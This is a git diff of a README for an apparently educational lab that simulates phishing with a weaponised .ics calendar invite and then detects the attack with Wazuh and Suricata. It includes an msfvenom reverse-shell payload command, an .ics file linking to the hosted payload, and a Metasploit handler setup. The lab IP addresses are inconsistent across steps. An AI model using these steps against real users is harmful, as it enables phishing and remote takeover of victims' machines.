@@ -14,6 +14,30 @@ This project replicates a phishing attack using a malicious .ics calendar invite
 
 ---
 
+## 📚 Table of Contents
+•	📌 Lab Setup
+o	🌐 Ubuntu Network Config
+o	🌐 Windows 10 Network Config
+________________________________________
+🛠️ Attack Simulation & Detection Phases
+•	✅ Phase 1: Setup and File Hosting on Ubuntu VM
+o	🎯 Payload Generation with msfvenom
+o	🌐 Hosting Payload via Apache
+•	📆 Phase 2: Create Malicious Calendar Invite (.ics)
+o	📄 Crafting .ics File with Embedded Payload Link
+•	📧 Phase 3: Send Phishing Email (from Ubuntu)
+o	📜 Python Script for Sending .ics File via Gmail SMTP
+•	🧪 Phase 4: Execute the Attack
+o	🖥️ Victim Opens Email & Payload
+o	💻 Attacker Gains Reverse Shell Access
+•	🔍 Phase 5: Wazuh Host Monitoring
+o	⚙️ Install & Connect Wazuh Agent to Manager
+•	🧠 Phase 6: Detecting the Attack with Suricata
+o	🛡️ Write Custom Suricata Rules
+o	🧪 Validate & Restart Suricata Configuration
+o	📈 Confirm Detection via fast.log
+
+
 ## 📌 Lab Setup
 
 - Use **Briged Adapter** (or Internal Network) for both VMs:
@@ -37,6 +61,7 @@ Repeat the same for **Windows VM**.
 ## 📸🌐Windows 10 Network Config
 ![windows 10 network](https://github.com/user-attachments/assets/d1c0d41c-61b2-4159-aa04-b044fee20eb6)
 
+---
 
 ## ✅Phase 1: Setup and File Hosting on /Ubuntu VM
 ### 🎯Goal
@@ -45,12 +70,15 @@ Generate a reverse shell payload to be delivered via phishing.
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=4444 -f exe > newpayload.exe
 ```
-Replace LHOST with your Ubuntu attacker's IP address.
+•	LHOST = Attacker VM's IP
+•	LPORT = Port for listener (ensure firewall allows it)
+[Replace LHOST with your Ubuntu attacker's IP address.]
 
 **Check the Payload File:**
 ```bash
 ls -lh newpayload.exe
 ```
+
 **Move the payload to the Apache web root:**
 ```bash
 sudo mv newpayload.exe /var/www/html/
@@ -66,10 +94,17 @@ sudo systemctl start apache2
 Now payload is at:
 http://192.168.56.107/newpayload.exe
 
+## 🧠 Why?
+This step simulates malware hosted on an attacker-controlled server. It's a common initial access vector in phishing attacks.
+
 ## Phase 2: 📆Create Malicious Calendar Invite (.ics)
 The ICS file is a standard format used by calendar apps like Outlook, Thunderbird, and Google Calendar. In this attack, the .ics file is weaponized with a malicious URL in the DESCRIPTION and LOCATION fields.
 
 Create a file named malicious_invite.ics:
+```bash
+nano malicious_invite.ics
+```
+Paste this content:
 ```bash
 BEGIN:VCALENDAR
 VERSION:2.0
@@ -85,13 +120,13 @@ LOCATION:http://192.168.0.107/newpayload.exe
 END:VEVENT
 END:VCALENDAR
 ```
+Save and Exit:
+  -Press Ctrl + O to save.
+  -Press Enter to confirm.
+  -Press Ctrl + X to exit.
+  
 Why it works: Many email clients render .ics files directly as invitations, often auto-parsing the DESCRIPTION into clickable links.
 
-## 🧪 How to Create and Use It
-### 📁 1. Save the .ics File
-```bash
-nano malicious_invite.ics
-```
 ## Phase 3: 📧 Send Phishing Email (from Ubuntu)
 **We need a Python script that sends an email with a proper calendar invite .ics attachment, including a friendly sender name, via Gmail SMTP.**
 
@@ -167,22 +202,12 @@ finally:
 ```bash
 python3 send_calendar_invite.py
 ```
+
 ## 📸Email sent successfully
 ![Email sent successfully](https://github.com/user-attachments/assets/939a550e-3469-490b-9be5-81915e818421)
 
 
-## 🖥️ Phase 4: Setup Wazuh Agent on Victim
-🧰 Steps
-1.	Download Wazuh Agent for Windows.
-2.	During setup, enter your attacker's IP as Wazuh Manager.
-4.	Start the agent from Windows Services.
-Wazuh will log actions and forward events to the Wazuh Manager
-
-## 📸Wazuh Agent
-![Wazuh Agent](https://github.com/user-attachments/assets/2f24a328-33d2-497e-bacf-e5cffdd6937f)
-
-
-## 🧪Phase 5: Execute the Attack
+## 🧪Phase 4: Execute the Attack
 ### 1. On the Windows VM (Victim):
 Open Email Client:
   -Access the email account configured to receive the phishing email.
@@ -203,7 +228,7 @@ Execute the Payload:
 ```bash
 msfconsole
 ```
-#### 2.Configure and Start the Handler:
+#### 2.Set Up Listener::
 ```bash
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
@@ -211,7 +236,8 @@ set LHOST 192.168.56.101
 set LPORT 4444
 exploit
 ```
-Replace 192.168.56.101 with your Ubuntu  IP address.
+Wait for session to establish.
+**Replace 192.168.56.101 with your Ubuntu  IP address.
 
 #### 3.Establish Session:
 Once the victim executes the payload, a Meterpreter session should be established.
@@ -221,7 +247,20 @@ Once the victim executes the payload, a Meterpreter session should be establishe
 
 ![UID](https://github.com/user-attachments/assets/27703320-b732-432d-afb3-d438e26ee3a5)
 
-## 🔍 Phase 5: Detecting the Attack with Suricata
+## 🔍 Phase 5: Wazuh Host Monitoring
+
+🎯 Goal: Detect suspicious host behavior from the victim's machine.
+Steps:
+•	Install Wazuh Agent on Windows 10.
+•	Set the manager IP to Ubuntu host.
+•	Start Wazuh agent service.
+•	View alerts in Wazuh dashboard or log files.
+
+## 📸Wazuh Agent
+![Wazuh Agent](https://github.com/user-attachments/assets/2f24a328-33d2-497e-bacf-e5cffdd6937f)
+
+
+## 🔍 Phase 6: Detecting the Attack with Suricata
 ### 1.Create Custom Suricata Rules
 1.Edit local.rules File:
 ```bash
